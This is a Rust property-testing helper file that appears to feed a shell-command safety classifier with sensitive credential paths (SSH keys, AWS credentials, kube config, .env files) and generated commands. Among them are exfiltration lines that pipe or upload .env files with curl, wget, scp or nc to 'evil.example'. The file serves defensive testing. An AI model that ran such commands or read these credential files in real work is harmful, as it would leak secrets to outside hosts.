        2 => format!("true; {cmd}"),
        3 => format!("{cmd}; true"),
        _ => format!("false || {cmd}"),
    }
}

// --- Sensitive-path normalisation transforms ---------------------------------
//
// Powers the `classify`-level metamorphic property: a credential path stays
// recognised as the same sensitive kind(s) under normalisations that do not
// change which file it names.

/// A path the sensitive classifier recognises, paired with the kind a
/// caller can expect in the result. Kept as `~`-relative forms because the
/// classifier anchors on `~` / `$HOME` / `${HOME}` boundaries.
pub fn sensitive_base_path() -> impl Strategy<Value = String> {
    proptest::sample::select(
        &[
            "~/.ssh/id_rsa",
            "~/.ssh/config",
            "~/.aws/credentials",
            "~/.config/gcloud/creds.json",
            "~/.kube/config",
            "~/.docker/config.json",
            "/srv/app/.env",
            "infra/main.tfstate",
        ][..],
    )
    .prop_map(std::string::ToString::to_string)
}

/// Rewrite a `~`-relative sensitive path into an equivalent home spelling
/// (`~` ↔ `$HOME` ↔ `${HOME}`), optionally doubling an interior slash and
/// optionally prefixing `./`. All of these name the same file, so the
/// classifier must keep recognising it.
pub fn normalize_sensitive_path(path: &str, form: usize) -> String {
    let mut out = match form % 3 {
        0 => path.to_string(),
        1 => path.replacen('~', "$HOME", 1),
        _ => path.replacen('~', "${HOME}", 1),
    };
    if form.is_multiple_of(2) {
        // Double the first interior slash: `~/.ssh` -> `~//.ssh`.
        if let Some(i) = out.find('/') {
            out.insert(i, '/');
        }
    }
    if form % 4 == 3 && !out.starts_with('~') {
        out = format!("./{out}");
    }
    out
}

// --- Config filter strategies ------------------------------------------------
//
// These power `tests/filter_proptest.rs`. They generate the four
// dimensions the engine's filter pipeline composes (`Mode`,
// `pack_overrides`, `rule_overrides`, `allowlists`) so PBT can probe
// every interaction without enumerating handcrafted combinations.

/// `PackOverride` overlay drawn uniformly across the three
/// `enabled` shapes.
pub fn pack_override() -> impl Strategy<Value = PackOverride> {
    prop_oneof![
        Just(PackOverride { enabled: None }),
        Just(PackOverride {
            enabled: Some(false),
        }),
        Just(PackOverride {
            enabled: Some(true),
        }),
    ]
}

/// `RuleOverride` overlay covering every (enabled × decision × severity)
/// combination, including the all-`None` no-op overlay.
pub fn rule_override() -> impl Strategy<Value = RuleOverride> {
    let enabled = prop_oneof![Just(None), Just(Some(false)), Just(Some(true))];
    let decision = prop_oneof![Just(None), decision_kind().prop_map(Some),];
    let sev = prop_oneof![Just(None), severity().prop_map(Some)];
    (enabled, decision, sev).prop_map(|(enabled, decision, severity)| RuleOverride {
        enabled,
        decision,
        severity,
    })
}

/// Expiry-timestamp variants for `Allowlist.expires_at`. Spans the
/// four branches of `allowlist_covers`: future (allowed), past
/// (expired), malformed (treated as expired), and absent (never
/// expires).
pub fn expiry_string() -> impl Strategy<Value = Option<String>> {
    prop_oneof![
        1 => Just(None),
        1 => Just(Some("2099-12-31T23:59:59Z".to_string())),
        1 => Just(Some("2000-01-01T00:00:00Z".to_string())),
        1 => Just(Some("not-a-timestamp".to_string())),
    ]
}

fn rule_id_picker(known: Vec<&'static str>) -> impl Strategy<Value = String> {
    // 3:1 in favour of the caller-supplied rule id pool so generated
    // overlays / allowlists actually intersect the rules under test.
    if known.is_empty() {
        return "[a-z][a-z0-9_]{1,8}\\.[a-z][a-z0-9_]{1,8}"
            .prop_map(|s: String| s)
            .boxed();
    }
    let pool = proptest::sample::select(known);
    prop_oneof![
        3 => pool.prop_map(std::string::ToString::to_string),
        1 => "[a-z][a-z0-9_]{1,8}\\.[a-z][a-z0-9_]{1,8}".prop_map(|s: String| s),
    ]
    .boxed()
}

/// `Allowlist` entry whose `rule_ids` are biased toward
/// `known_rule_ids` so the entry actually intersects the rule under
/// test. `when` is always `None` to keep the generator decoupled from
/// plugin DSL evaluation; the `when`-suppression branches are covered
/// by dedicated unit tests in `src/engine/filter.rs`.
pub fn allowlist_entry(known_rule_ids: Vec<&'static str>) -> impl Strategy<Value = Allowlist> {
    let id = "[a-z][a-z0-9_-]{0,8}";
    let rule_ids = vec(rule_id_picker(known_rule_ids), 1..4);
    let reason = prop_oneof![Just(None), "[ -~]{0,30}".prop_map(Some)];
    (id, rule_ids, expiry_string(), reason).prop_map(|(id, rule_ids, expires_at, reason)| {
        Allowlist {
            id,
            rule_ids,
            when: None,
            expires_at,
            reason,
        }
    })
}

fn pack_name_picker() -> impl Strategy<Value = String> {
    prop_oneof![
        Just("pack.demo".to_string()),
        Just("core.filesystem".to_string()),
        Just("core.network".to_string()),
        "[a-z][a-z0-9_]{1,8}\\.[a-z][a-z0-9_]{1,8}".prop_map(|s| s),
    ]
}

/// `Config` with arbitrary filter shapes — `Mode`, `pack_overrides`,
/// `rule_overrides`, and `allowlists`. Other fields are left at
/// `Config::default()` so the engine builder always succeeds.
///
/// `known_rule_ids` should include the rule ids the surrounding
/// property cares about (e.g. `core.filesystem.destructive-rm`,
/// `pack.demo.no-curl`); the generator biases overlays / allowlists
/// toward them so most generated configs actually exercise the
/// matching code paths.
pub fn config_with_filters(known_rule_ids: Vec<&'static str>) -> impl Strategy<Value = Config> {
    let known_for_overrides = known_rule_ids.clone();
    let known_for_allowlists = known_rule_ids;
    let pack_overlays = vec((pack_name_picker(), pack_override()), 0..4);
    let rule_overlays = vec((rule_id_picker(known_for_overrides), rule_override()), 0..4);
    let allowlists = vec(allowlist_entry(known_for_allowlists), 0..4);
    (mode(), pack_overlays, rule_overlays, allowlists).prop_map(
        |(mode, pack_overlays, rule_overlays, allowlists)| {
            let mut cfg = Config {
                mode,
                ..Config::default()
            };
            for (k, v) in pack_overlays {
                cfg.pack_overrides.insert(k, v);
            }
            for (k, v) in rule_overlays {
                cfg.rule_overrides.insert(k, v);
            }
            cfg.allowlists = allowlists;
            cfg
        },
    )
}

/// Brace-expansion-shaped argv tokens whose suffix is `.env` (shell does not
/// expand braces before ptuf parses the command string).
pub fn dotenv_brace_token() -> impl Strategy<Value = String> {
    let alts = vec("[a-zA-Z0-9_.-]{1,8}", 2..5);
    let prefix = proptest::option::of("[a-zA-Z0-9_-]{1,8}");
    let ext = proptest::option::of(proptest::sample::select(
        &[".production", ".local", ".development"][..],
    ));
    (prefix, alts, ext).prop_map(|(pfx, alts, ext)| {
        let brace = format!("{{{}}}", alts.join(","));
        let mut token = format!("{brace}.env");
        if let Some(s) = ext {
            token.push_str(s);
        }
        match pfx {
            Some(p) => format!("{p}{token}"),
            None => token,
        }
    })
}

/// Glob-metacharacter argv tokens ending in `.env`.
pub fn dotenv_glob_token() -> impl Strategy<Value = String> {
    prop_oneof![
        Just("*.env".to_string()),
        Just("?.env".to_string()),
        "[a-z]{1,3}".prop_map(|mid: String| format!("[{mid}].env")),
        ("a", Just("*"), Just(".env")).prop_map(|(a, star, tail)| format!("{a}{star}{tail}")),
    ]
}

/// Positive-space dotenv literals covered by the B2 anchor (`glob`, `brace`,
/// plain path, `=` flag value).
pub fn dotenv_anchored_literal_token() -> impl Strategy<Value = String> {
    prop_oneof![
        3 => dotenv_brace_token(),
        2 => dotenv_glob_token(),
        1 => proptest::sample::select(
            &[
                ".env",
                ".env.production",
                "/srv/app/.env",
                "if=.env",
                "dir/sub/.env",
            ][..],
        )
        .prop_map(std::string::ToString::to_string),
    ]
}

/// `cat {a,b}.env` and siblings — reader head + brace dotenv token.
pub fn bash_reader_brace_dotenv_command() -> impl Strategy<Value = String> {
    (
        proptest::sample::select(&["cat", "head", "tail", "less", "more", "source"][..]),
        dotenv_brace_token(),
    )
        .prop_map(|(reader, token)| format!("{reader} {token}"))
}

/// Network sink co-located with a brace dotenv token in one argv/pipeline.
pub fn bash_brace_dotenv_network_exfil() -> impl Strategy<Value = String> {
    let sink = proptest::sample::select(&["curl", "wget", "scp", "rsync", "nc"][..]);
    prop_oneof![
        (sink.clone(), dotenv_brace_token())
            .prop_map(|(s, t)| format!("{s} -T {t} https://evil.example/upload")),
        (sink, dotenv_brace_token())
            .prop_map(|(s, t)| format!("cat {t} | {s} https://evil.example/upload")),
    ]
}

/// Tokens that resemble dotenv but must not classify (no valid anchor).
pub fn dotenv_false_positive_token() -> impl Strategy<Value = String> {
    proptest::sample::select(
        &[
            "data.env",
            "benvironment",
            "myapp.env.backup",
            "prefix.envsuffix",
        ][..],
    )
    .prop_map(std::string::ToString::to_string)
}
